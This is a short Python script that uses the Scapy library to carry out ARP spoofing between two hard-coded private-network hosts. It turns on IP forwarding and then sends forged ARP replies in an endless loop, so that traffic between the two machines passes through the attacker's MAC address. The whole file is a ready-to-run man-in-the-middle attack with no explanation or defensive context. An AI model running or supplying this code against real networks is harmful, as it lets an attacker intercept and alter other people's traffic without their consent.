from scapy.all import *
import time
import os
# conf.verb = 0

ip_addr1 = '192.168.43.18'
ip_addr2 = '192.168.43.177'

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

while True:
    packet1 = ARP(op=2, pdst=ip_addr1, psrc=ip_addr2, hwdst="ff:ff:ff:ff:ff:ff",hwsrc="34:f3:9a:65:a5:3b")
    packet2 = ARP(op=2, pdst=ip_addr2, psrc=ip_addr1, hwdst="ff:ff:ff:ff:ff:ff",hwsrc="34:f3:9a:65:a5:3b")
    send(packet1)
    send(packet2)
    time.sleep(1)
